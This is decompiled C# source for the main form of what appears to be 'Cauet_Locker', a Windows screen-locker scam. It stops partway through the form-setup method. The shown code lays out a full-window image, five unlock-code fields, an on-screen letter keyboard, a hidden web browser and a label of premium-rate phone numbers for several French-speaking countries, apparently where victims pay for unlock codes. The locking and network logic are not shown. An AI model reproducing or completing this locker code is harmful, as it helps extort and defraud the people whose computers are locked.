using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Cauet_Locker.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("TextBox1")]
	private TextBox textBox_0;

	[AccessedThroughProperty("Label5")]
	private Label label_0;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser webBrowser_0;

	[AccessedThroughProperty("TextBox2")]
	private TextBox textBox_1;

	[AccessedThroughProperty("TextBox3")]
	private TextBox textBox_2;

	[AccessedThroughProperty("TextBox4")]
	private TextBox textBox_3;

	[AccessedThroughProperty("TextBox5")]
	private TextBox textBox_4;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox pictureBox_0;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox pictureBox_1;

	[AccessedThroughProperty("Timer3")]
	private Timer timer_2;

	[AccessedThroughProperty("Button2")]
	private Button button_0;

	[AccessedThroughProperty("Button3")]
	private Button button_1;

	[AccessedThroughProperty("Button4")]
	private Button button_2;

	[AccessedThroughProperty("Button5")]
	private Button button_3;

	[AccessedThroughProperty("Button6")]
	private Button button_4;

	[AccessedThroughProperty("Button7")]
	private Button button_5;

	[AccessedThroughProperty("Button8")]
	private Button button_6;

	[AccessedThroughProperty("Button9")]
	private Button button_7;

	[AccessedThroughProperty("Button10")]
	private Button button_8;

	[AccessedThroughProperty("Button11")]
	private Button button_9;

	[AccessedThroughProperty("Button12")]
	private Button button_10;

	[AccessedThroughProperty("Button13")]
	private Button button_11;

	[AccessedThroughProperty("Button14")]
	private Button button_12;

	[AccessedThroughProperty("Button15")]
	private Button button_13;

	[AccessedThroughProperty("Button16")]
	private Button button_14;

	[AccessedThroughProperty("Button17")]
	private Button button_15;

	[AccessedThroughProperty("Button18")]
	private Button button_16;

	[AccessedThroughProperty("Button19")]
	private Button button_17;

	[AccessedThroughProperty("Button20")]
	private Button button_18;

	[AccessedThroughProperty("Button21")]
	private Button button_19;

	[AccessedThroughProperty("Button22")]
	private Button button_20;

	[AccessedThroughProperty("Button23")]
	private Button button_21;

	[AccessedThroughProperty("Button24")]
	private Button button_22;

	[AccessedThroughProperty("Button25")]
	private Button button_23;

	[AccessedThroughProperty("Button26")]
	private Button button_24;

	[AccessedThroughProperty("Button27")]
	private Button button_25;

	[AccessedThroughProperty("Button28")]
	private Button button_26;

	[AccessedThroughProperty("WebBrowser2")]
	private WebBrowser webBrowser_1;

	private const int int_0 = 128;

	private const int int_1 = 64;

	private int int_2;

	private TextBox textBox_5;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		textBox_5 = null;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected O, but got Unknown
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0130: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Expected O, but got Unknown
		//IL_0189: Unknown result type (might be due to invalid IL or missing references)
		//IL_0193: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Expected O, but got Unknown
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a9: Expected O, but got Unknown
		//IL_01aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Expected O, but got Unknown
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Expected O, but got Unknown
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Expected O, but got Unknown
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_0214: Unknown result type (might be due to invalid IL or missing references)
		//IL_021e: Expected O, but got Unknown
		//IL_02a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02af: Expected O, but got Unknown
		//IL_03ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected O, but got Unknown
		//IL_042e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0438: Expected O, but got Unknown
		//IL_04af: Unknown result type (might be due to invalid IL or missing references)
		//IL_04b9: Expected O, but got Unknown
		//IL_0530: Unknown result type (might be due to invalid IL or missing references)
		//IL_053a: Expected O, but got Unknown
		//IL_1863: Unknown result type (might be due to invalid IL or missing references)
		//IL_186d: Expected O, but got Unknown
		//IL_1888: Unknown result type (might be due to invalid IL or missing references)
		icontainer_0 = new Container();
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new TextBox());
		vmethod_5(new Label());
		vmethod_7(new WebBrowser());
		vmethod_9(new TextBox());
		vmethod_11(new TextBox());
		vmethod_13(new TextBox());
		vmethod_15(new TextBox());
		vmethod_17(new Timer(icontainer_0));
		vmethod_23(new Timer(icontainer_0));
		vmethod_25(new Button());
		vmethod_27(new Button());
		vmethod_29(new Button());
		vmethod_31(new Button());
		vmethod_33(new Button());
		vmethod_35(new Button());
		vmethod_37(new Button());
		vmethod_39(new Button());
		vmethod_41(new Button());
		vmethod_43(new Button());
		vmethod_45(new Button());
		vmethod_47(new Button());
		vmethod_49(new Button());
		vmethod_51(new Button());
		vmethod_53(new Button());
		vmethod_55(new Button());
		vmethod_57(new Button());
		vmethod_59(new Button());
		vmethod_61(new Button());
		vmethod_63(new Button());
		vmethod_65(new Button());
		vmethod_67(new Button());
		vmethod_69(new Button());
		vmethod_71(new Button());
		vmethod_73(new Button());
		vmethod_75(new Button());
		vmethod_77(new Button());
		vmethod_79(new WebBrowser());
		vmethod_21(new PictureBox());
		vmethod_19(new PictureBox());
		((ISupportInitialize)vmethod_20()).BeginInit();
		((ISupportInitialize)vmethod_18()).BeginInit();
		((Control)this).SuspendLayout();
		vmethod_0().set_Interval(10000);
		((Control)vmethod_2()).set_Font(new Font("Verdana", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj = vmethod_2();
		Point location = new Point(732, 352);
		((Control)obj).set_Location(location);
		((Control)vmethod_2()).set_Name("TextBox1");
		TextBox obj2 = vmethod_2();
		Size size = new Size(286, 30);
		((Control)obj2).set_Size(size);
		((Control)vmethod_2()).set_TabIndex(9);
		vmethod_2().set_Text("Code 1 :");
		((Control)vmethod_4()).set_BackColor(Color.White);
		((Control)vmethod_4()).set_Font(new Font("Verdana", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)vmethod_4()).set_ForeColor(Color.Firebrick);
		Label obj3 = vmethod_4();
		location = new Point(1034, 365);
		((Control)obj3).set_Location(location);
		((Control)vmethod_4()).set_Name("Label5");
		Label obj4 = vmethod_4();
		size = new Size(184, 211);
		((Control)obj4).set_Size(size);
		((Control)vmethod_4()).set_TabIndex(11);
		vmethod_4().set_Text("Numéros\r\n\r\nFrance : 0899700497\r\n\r\nBelgique : 090444319\r\n\r\nSuisse : 0901902963\r\n\r\nLuxembourg : 90129526\r\n\r\nCanada : 900-524-0007\r\n\r\nDOM : 0899702003");
		WebBrowser obj5 = vmethod_6();
		location = new Point(710, 28);
		((Control)obj5).set_Location(location);
		WebBrowser obj6 = vmethod_6();
		size = new Size(20, 20);
		((Control)obj6).set_MinimumSize(size);
		((Control)vmethod_6()).set_Name("WebBrowser1");
		WebBrowser obj7 = vmethod_6();
		size = new Size(508, 96);
		((Control)obj7).set_Size(size);
		((Control)vmethod_6()).set_TabIndex(12);
		((Control)vmethod_6()).set_Visible(false);
		((Control)vmethod_8()).set_Font(new Font("Verdana", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj8 = vmethod_8();
		location = new Point(732, 381);
		((Control)obj8).set_Location(location);
		((Control)vmethod_8()).set_Name("TextBox2");
		TextBox obj9 = vmethod_8();
		size = new Size(286, 30);
		((Control)obj9).set_Size(size);
		((Control)vmethod_8()).set_TabIndex(13);
		vmethod_8().set_Text("Code 2 :");
		((Control)vmethod_10()).set_Font(new Font("Verdana", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj10 = vmethod_10();
		location = new Point(732, 410);
		((Control)obj10).set_Location(location);
		((Control)vmethod_10()).set_Name("TextBox3");
		TextBox obj11 = vmethod_10();
		size = new Size(286, 30);
		((Control)obj11).set_Size(size);
		((Control)vmethod_10()).set_TabIndex(14);
		vmethod_10().set_Text("Code 3 :");
		((Control)vmethod_12()).set_Font(new Font("Verdana", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj12 = vmethod_12();
		location = new Point(732, 439);
		((Control)obj12).set_Location(location);
		((Control)vmethod_12()).set_Name("TextBox4");
		TextBox obj13 = vmethod_12();
		size = new Size(286, 30);
		((Control)obj13).set_Size(size);
		((Control)vmethod_12()).set_TabIndex(15);
		vmethod_12().set_Text("Code 4 :");
		((Control)vmethod_14()).set_Font(new Font("Verdana", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj14 = vmethod_14();
		location = new Point(732, 468);
		((Control)obj14).set_Location(location);
		((Control)vmethod_14()).set_Name("TextBox5");
		TextBox obj15 = vmethod_14();
		size = new Size(286, 30);
		((Control)obj15).set_Size(size);
		((Control)vmethod_14()).set_TabIndex(16);
		vmethod_14().set_Text("Code 5 :");
		vmethod_16().set_Interval(10000);
		((Control)vmethod_24()).set_ForeColor(Color.Firebrick);
		Button obj16 = vmethod_24();
		location = new Point(732, 515);
		((Control)obj16).set_Location(location);
		((Control)vmethod_24()).set_Name("Button2");
		Button obj17 = vmethod_24();
		size = new Size(22, 22);
		((Control)obj17).set_Size(size);
		((Control)vmethod_24()).set_TabIndex(33);
		((ButtonBase)vmethod_24()).set_Text("A");
		((ButtonBase)vmethod_24()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_24()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_26()).set_ForeColor(Color.Firebrick);
		Button obj18 = vmethod_26();
		location = new Point(869, 568);
		((Control)obj18).set_Location(location);
		((Control)vmethod_26()).set_Name("Button3");
		Button obj19 = vmethod_26();
		size = new Size(22, 22);
		((Control)obj19).set_Size(size);
		((Control)vmethod_26()).set_TabIndex(34);
		((ButtonBase)vmethod_26()).set_Text("B");
		((ButtonBase)vmethod_26()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_26()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_28()).set_ForeColor(Color.Firebrick);
		Button obj20 = vmethod_28();
		location = new Point(813, 568);
		((Control)obj20).set_Location(location);
		((Control)vmethod_28()).set_Name("Button4");
		Button obj21 = vmethod_28();
		size = new Size(22, 22);
		((Control)obj21).set_Size(size);
		((Control)vmethod_28()).set_TabIndex(35);
		((ButtonBase)vmethod_28()).set_Text("C");
		((ButtonBase)vmethod_28()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_28()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_30()).set_ForeColor(Color.Firebrick);
		Button obj22 = vmethod_30();
		location = new Point(785, 543);
		((Control)obj22).set_Location(location);
		((Control)vmethod_30()).set_Name("Button5");
		Button obj23 = vmethod_30();
		size = new Size(22, 22);
		((Control)obj23).set_Size(size);
		((Control)vmethod_30()).set_TabIndex(36);
		((ButtonBase)vmethod_30()).set_Text("D");
		((ButtonBase)vmethod_30()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_30()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_32()).set_ForeColor(Color.Firebrick);
		Button obj24 = vmethod_32();
		location = new Point(785, 515);
		((Control)obj24).set_Location(location);
		((Control)vmethod_32()).set_Name("Button6");
		Button obj25 = vmethod_32();
		size = new Size(22, 22);
		((Control)obj25).set_Size(size);
		((Control)vmethod_32()).set_TabIndex(37);
		((ButtonBase)vmethod_32()).set_Text("E");
		((ButtonBase)vmethod_32()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_32()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_34()).set_ForeColor(Color.Firebrick);
		Button obj26 = vmethod_34();
		location = new Point(813, 543);
		((Control)obj26).set_Location(location);
		((Control)vmethod_34()).set_Name("Button7");
		Button obj27 = vmethod_34();
		size = new Size(22, 22);
		((Control)obj27).set_Size(size);
		((Control)vmethod_34()).set_TabIndex(38);
		((ButtonBase)vmethod_34()).set_Text("F");
		((ButtonBase)vmethod_34()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_34()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_36()).set_ForeColor(Color.Firebrick);
		Button obj28 = vmethod_36();
		location = new Point(841, 543);
		((Control)obj28).set_Location(location);
		((Control)vmethod_36()).set_Name("Button8");
		Button obj29 = vmethod_36();
		size = new Size(22, 22);
		((Control)obj29).set_Size(size);
		((Control)vmethod_36()).set_TabIndex(39);
		((ButtonBase)vmethod_36()).set_Text("G");
		((ButtonBase)vmethod_36()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_36()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_38()).set_ForeColor(Color.Firebrick);
		Button obj30 = vmethod_38();
		location = new Point(869, 543);
		((Control)obj30).set_Location(location);
		((Control)vmethod_38()).set_Name("Button9");
		Button obj31 = vmethod_38();
		size = new Size(22, 22);
		((Control)obj31).set_Size(size);
		((Control)vmethod_38()).set_TabIndex(40);
		((ButtonBase)vmethod_38()).set_Text("H");
		((ButtonBase)vmethod_38()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_38()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_40()).set_ForeColor(Color.Firebrick);
		Button obj32 = vmethod_40();
		location = new Point(922, 515);
		((Control)obj32).set_Location(location);
		((Control)vmethod_40()).set_Name("Button10");
		Button obj33 = vmethod_40();
		size = new Size(22, 22);
		((Control)obj33).set_Size(size);
		((Control)vmethod_40()).set_TabIndex(41);
		((ButtonBase)vmethod_40()).set_Text("I");
		((ButtonBase)vmethod_40()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_40()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_42()).set_ForeColor(Color.Firebrick);
		Button obj34 = vmethod_42();
		location = new Point(894, 543);
		((Control)obj34).set_Location(location);
		((Control)vmethod_42()).set_Name("Button11");
		Button obj35 = vmethod_42();
		size = new Size(22, 22);
		((Control)obj35).set_Size(size);
		((Control)vmethod_42()).set_TabIndex(42);
		((ButtonBase)vmethod_42()).set_Text("J");
		((ButtonBase)vmethod_42()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_42()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_44()).set_ForeColor(Color.Firebrick);
		Button obj36 = vmethod_44();
		location = new Point(922, 543);
		((Control)obj36).set_Location(location);
		((Control)vmethod_44()).set_Name("Button12");
		Button obj37 = vmethod_44();
		size = new Size(22, 22);
		((Control)obj37).set_Size(size);
		((Control)vmethod_44()).set_TabIndex(43);
		((ButtonBase)vmethod_44()).set_Text("K");
		((ButtonBase)vmethod_44()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_44()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_46()).set_ForeColor(Color.Firebrick);
		Button obj38 = vmethod_46();
		location = new Point(950, 543);
		((Control)obj38).set_Location(location);
		((Control)vmethod_46()).set_Name("Button13");
		Button obj39 = vmethod_46();
		size = new Size(22, 22);
		((Control)obj39).set_Size(size);
		((Control)vmethod_46()).set_TabIndex(44);
		((ButtonBase)vmethod_46()).set_Text("L");
		((ButtonBase)vmethod_46()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_46()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_48()).set_ForeColor(Color.Firebrick);
		Button obj40 = vmethod_48();
		location = new Point(978, 543);
		((Control)obj40).set_Location(location);
		((Control)vmethod_48()).set_Name("Button14");
		Button obj41 = vmethod_48();
		size = new Size(22, 22);
		((Control)obj41).set_Size(size);
		((Control)vmethod_48()).set_TabIndex(45);
		((ButtonBase)vmethod_48()).set_Text("M");
		((ButtonBase)vmethod_48()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_48()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_50()).set_ForeColor(Color.Firebrick);
		Button obj42 = vmethod_50();
		location = new Point(894, 568);
		((Control)obj42).set_Location(location);
		((Control)vmethod_50()).set_Name("Button15");
		Button obj43 = vmethod_50();
		size = new Size(22, 22);
		((Control)obj43).set_Size(size);
		((Control)vmethod_50()).set_TabIndex(46);
		((ButtonBase)vmethod_50()).set_Text("N");
		((ButtonBase)vmethod_50()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_50()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_52()).set_ForeColor(Color.Firebrick);
		Button obj44 = vmethod_52();
		location = new Point(950, 515);
		((Control)obj44).set_Location(location);
		((Control)vmethod_52()).set_Name("Button16");
		Button obj45 = vmethod_52();
		size = new Size(22, 22);
		((Control)obj45).set_Size(size);
		((Control)vmethod_52()).set_TabIndex(47);
		((ButtonBase)vmethod_52()).set_Text("O");
		((ButtonBase)vmethod_52()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_52()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_54()).set_ForeColor(Color.Firebrick);
		Button obj46 = vmethod_54();
		location = new Point(978, 515);
		((Control)obj46).set_Location(location);
		((Control)vmethod_54()).set_Name("Button17");
		Button obj47 = vmethod_54();
		size = new Size(22, 22);
		((Control)obj47).set_Size(size);
		((Control)vmethod_54()).set_TabIndex(48);
		((ButtonBase)vmethod_54()).set_Text("P");
		((ButtonBase)vmethod_54()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_54()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_56()).set_ForeColor(Color.Firebrick);
		Button obj48 = vmethod_56();
		location = new Point(732, 543);
		((Control)obj48).set_Location(location);
		((Control)vmethod_56()).set_Name("Button18");
		Button obj49 = vmethod_56();
		size = new Size(22, 22);
		((Control)obj49).set_Size(size);
		((Control)vmethod_56()).set_TabIndex(49);
		((ButtonBase)vmethod_56()).set_Text("Q");
		((ButtonBase)vmethod_56()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_56()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_58()).set_ForeColor(Color.Firebrick);
		Button obj50 = vmethod_58();
		location = new Point(813, 515);
		((Control)obj50).set_Location(location);
		((Control)vmethod_58()).set_Name("Button19");
		Button obj51 = vmethod_58();
		size = new Size(22, 22);
		((Control)obj51).set_Size(size);
		((Control)vmethod_58()).set_TabIndex(50);
		((ButtonBase)vmethod_58()).set_Text("R");
		((ButtonBase)vmethod_58()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_58()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_60()).set_ForeColor(Color.Firebrick);
		Button obj52 = vmethod_60();
		location = new Point(760, 543);
		((Control)obj52).set_Location(location);
		((Control)vmethod_60()).set_Name("Button20");
		Button obj53 = vmethod_60();
		size = new Size(22, 22);
		((Control)obj53).set_Size(size);
		((Control)vmethod_60()).set_TabIndex(51);
		((ButtonBase)vmethod_60()).set_Text("S");
		((ButtonBase)vmethod_60()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_60()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_62()).set_ForeColor(Color.Firebrick);
		Button obj54 = vmethod_62();
		location = new Point(841, 515);
		((Control)obj54).set_Location(location);
		((Control)vmethod_62()).set_Name("Button21");
		Button obj55 = vmethod_62();
		size = new Size(22, 22);
		((Control)obj55).set_Size(size);
		((Control)vmethod_62()).set_TabIndex(52);
		((ButtonBase)vmethod_62()).set_Text("T");
		((ButtonBase)vmethod_62()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_62()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_64()).set_ForeColor(Color.Firebrick);
		Button obj56 = vmethod_64();
		location = new Point(894, 515);
		((Control)obj56).set_Location(location);
		((Control)vmethod_64()).set_Name("Button22");
		Button obj57 = vmethod_64();
		size = new Size(22, 22);
		((Control)obj57).set_Size(size);
		((Control)vmethod_64()).set_TabIndex(53);
		((ButtonBase)vmethod_64()).set_Text("U");
		((ButtonBase)vmethod_64()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_64()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_66()).set_ForeColor(Color.Firebrick);
		Button obj58 = vmethod_66();
		location = new Point(841, 568);
		((Control)obj58).set_Location(location);
		((Control)vmethod_66()).set_Name("Button23");
		Button obj59 = vmethod_66();
		size = new Size(22, 22);
		((Control)obj59).set_Size(size);
		((Control)vmethod_66()).set_TabIndex(54);
		((ButtonBase)vmethod_66()).set_Text("V");
		((ButtonBase)vmethod_66()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_66()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_68()).set_ForeColor(Color.Firebrick);
		Button obj60 = vmethod_68();
		location = new Point(760, 568);
		((Control)obj60).set_Location(location);
		((Control)vmethod_68()).set_Name("Button24");
		Button obj61 = vmethod_68();
		size = new Size(22, 22);
		((Control)obj61).set_Size(size);
		((Control)vmethod_68()).set_TabIndex(55);
		((ButtonBase)vmethod_68()).set_Text("W");
		((ButtonBase)vmethod_68()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_68()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_70()).set_ForeColor(Color.Firebrick);
		Button obj62 = vmethod_70();
		location = new Point(785, 568);
		((Control)obj62).set_Location(location);
		((Control)vmethod_70()).set_Name("Button25");
		Button obj63 = vmethod_70();
		size = new Size(22, 22);
		((Control)obj63).set_Size(size);
		((Control)vmethod_70()).set_TabIndex(56);
		((ButtonBase)vmethod_70()).set_Text("X");
		((ButtonBase)vmethod_70()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_70()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_72()).set_ForeColor(Color.Firebrick);
		Button obj64 = vmethod_72();
		location = new Point(922, 568);
		((Control)obj64).set_Location(location);
		((Control)vmethod_72()).set_Name("Button26");
		Button obj65 = vmethod_72();
		size = new Size(78, 22);
		((Control)obj65).set_Size(size);
		((Control)vmethod_72()).set_TabIndex(57);
		((ButtonBase)vmethod_72()).set_Text("Entrer");
		((ButtonBase)vmethod_72()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_74()).set_ForeColor(Color.Firebrick);
		Button obj66 = vmethod_74();
		location = new Point(869, 515);
		((Control)obj66).set_Location(location);
		((Control)vmethod_74()).set_Name("Button27");
		Button obj67 = vmethod_74();
		size = new Size(22, 22);
		((Control)obj67).set_Size(size);
		((Control)vmethod_74()).set_TabIndex(58);
		((ButtonBase)vmethod_74()).set_Text("Y");
		((ButtonBase)vmethod_74()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_74()).set_UseVisualStyleBackColor(true);
		((Control)vmethod_76()).set_ForeColor(Color.Firebrick);
		Button obj68 = vmethod_76();
		location = new Point(759, 515);
		((Control)obj68).set_Location(location);
		((Control)vmethod_76()).set_Name("Button28");
		Button obj69 = vmethod_76();
		size = new Size(22, 22);
		((Control)obj69).set_Size(size);
		((Control)vmethod_76()).set_TabIndex(59);
		((ButtonBase)vmethod_76()).set_Text("Z");
		((ButtonBase)vmethod_76()).set_TextAlign((ContentAlignment)16);
		((ButtonBase)vmethod_76()).set_UseVisualStyleBackColor(true);
		WebBrowser obj70 = vmethod_78();
		location = new Point(137, 499);
		((Control)obj70).set_Location(location);
		WebBrowser obj71 = vmethod_78();
		size = new Size(20, 20);
		((Control)obj71).set_MinimumSize(size);
		((Control)vmethod_78()).set_Name("WebBrowser2");
		WebBrowser obj72 = vmethod_78();
		size = new Size(523, 284);
		((Control)obj72).set_Size(size);
		((Control)vmethod_78()).set_TabIndex(60);
		vmethod_78().set_WebBrowserShortcutsEnabled(false);
		vmethod_20().set_Image((Image)(object)Resources.smethod_4());
		PictureBox obj73 = vmethod_20();
		location = new Point(460, 253);
		((Control)obj73).set_Location(location);
		((Control)vmethod_20()).set_Name("PictureBox2");
		PictureBox obj74 = vmethod_20();
		size = new Size(35, 35);
		((Control)obj74).set_Size(size);
		vmethod_20().set_SizeMode((PictureBoxSizeMode)2);
		vmethod_20().set_TabIndex(32);
		vmethod_20().set_TabStop(false);
		vmethod_18().set_Image((Image)(object)Resources.smethod_3());
		PictureBox obj75 = vmethod_18();
		location = new Point(105, 12);
		((Control)obj75).set_Location(location);
		((Control)vmethod_18()).set_Name("PictureBox1");
		PictureBox obj76 = vmethod_18();
		size = new Size(1133, 817);
		((Control)obj76).set_Size(size);
		vmethod_18().set_TabIndex(31);
		vmethod_18().set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(10f, 20f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.FromArgb(240, 241, 243));
		size = new Size(1278, 842);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)vmethod_78());
		((Control)this).get_Controls().Add((Control)(object)vmethod_76());
		((Control)this).get_Controls().Add((Control)(object)vmethod_74());
		((Control)this).get_Controls().Add((Control)(object)vmethod_72());
		((Control)this).get_Controls().Add((Control)(object)vmethod_70());
		((Control)this).get_Controls().Add((Control)(object)vmethod_68());
		((Control)this).get_Controls().Add((Control)(object)vmethod_66());
		((Control)this).get_Controls().Add((Control)(object)vmethod_64());
		((Control)this).get_Controls().Add((Control)(object)vmethod_62());
		((Control)this).get_Controls().Add((Control)(object)vmethod_60());
		((Control)this).get_Controls().Add((Control)(object)vmethod_58());
		((Control)this).get_Controls().Add((Control)(object)vmethod_56());
		((Control)this).get_Controls().Add((Control)(object)vmethod_54());
		((Control)this).get_Controls().Add((Control)(object)vmethod_52());
		((Control)this).get_Controls().Add((Control)(object)vmethod_50());
		((Control)this).get_Controls().Add((Control)(object)vmethod_48());
		((Control)this).get_Controls().Add((Control)(object)vmethod_46());
